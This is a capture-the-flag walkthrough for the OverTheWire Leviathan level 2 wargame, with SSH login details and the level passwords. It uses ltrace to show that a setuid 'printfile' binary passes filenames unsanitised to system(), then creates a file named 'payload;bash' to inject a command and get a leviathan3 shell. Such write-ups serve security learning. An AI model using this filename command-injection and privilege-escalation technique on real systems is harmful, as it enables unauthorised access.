### Login
`ssh`: ssh leviathan2@leviathan.labs.overthewire.org -p 2223
`password`: mEh5PNl10e

### Solution
Lets use the `ls -al` command to see what files are availabe for us in the home directory:
```shell
leviathan3@gibson:~$ ls -al
total 36
drwxr-xr-x  2 root       root        4096 Oct  5 06:19 .
drwxr-xr-x 83 root       root        4096 Oct  5 06:20 ..
-rw-r--r--  1 root       root         220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root        3771 Jan  6  2022 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15060 Oct  5 06:19 printfile
-rw-r--r--  1 root       root         807 Jan  6  2022 .profile
```

It seems that there's a binary named `printfile` available. It also looks like this binary can be executed. Let's execute `printfile` to understand its functionality:
```shell
leviathan3@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan3@gibson:~$ 
```

The `printfile` binary appears to accept a file as an argument and outputs the contents of the provided file. Let's attempt to give it the password file for `leviathan3` as an argument:

```shell
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Of course it wouldnt be that easy! We've learned what occurs when we feed a file that we can't access to the binary. But what if we give the binary a file that we can access? It's always wise to examine all scenarios and note any differences. However, we first need to generate a test file:

```shell
leviathan2@gibson:~$ mkdir /tmp/kevin
leviathan2@gibson:~$ touch /tmp/kevin/test.txt
leviathan2@gibson:~$ ./printfile /tmp/kevin/test.txt
```

It appears that `printfile` successfully displayed the contents of our `test.txt` file. Since our test file was empty, there was nothing to show. Let's repeat this process, but this time, we'll utilize `ltrace`:

```shell
leviathan2@gibson:~$ ltrace ./printfile /tmp/kevin/test.txt 
__libc_start_main(0x80491e6, 2, 0xffffd5c4, 0 <unfinished ...>
access("/tmp/kevin/test.txt", 4)                                              = 0
snprintf("/bin/cat /tmp/kevin/test.txt", 511, "/bin/cat %s", "/tmp/kevin/test.txt") = 28
geteuid()                                                                     = 12002
geteuid()                                                                     = 12002
setreuid(12002, 12002)                                                        = 0
system("/bin/cat /tmp/kevin/test.txt" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                        = 0
+++ exited (status 0) +++
```

I smell a vulnerability! It seems access is utilized to verify if the invoking process has access to the file pathname. However, observe `snprintf`. It executes `/bin/cat` on the file we provide. There doesn't seem to be any input validation. What would occur if we generate a file named `payload;bash` and feed it to the binary?!

```
leviathan2@gibson:~$ touch "/tmp/kevin/payload;bash"
leviathan2@gibson:~$ ./printfile /tmp/kevin/payload\;bash 
leviathan3@gibson:~$ 
```

It appears we are now operating as `leviathan3`! Let's display the contents of the password file using `cat`:

```shell
leviathan3@gibson:~$ cat /etc/leviathan_pass/leviathan3 
Q0G8j4sakn
```
